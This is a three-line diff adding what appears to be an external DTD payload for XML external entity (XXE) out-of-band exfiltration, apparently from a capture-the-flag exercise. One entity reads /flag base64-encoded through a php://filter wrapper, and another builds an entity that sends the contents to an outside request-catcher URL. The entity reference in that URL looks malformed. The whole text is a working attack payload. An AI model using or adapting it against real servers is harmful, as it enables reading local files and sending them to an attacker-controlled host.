@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM
+"php://filter/read=convert.base64-encode/resource=/flag">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'https://114514.requestcatcher.com/?p=file;'>"> 
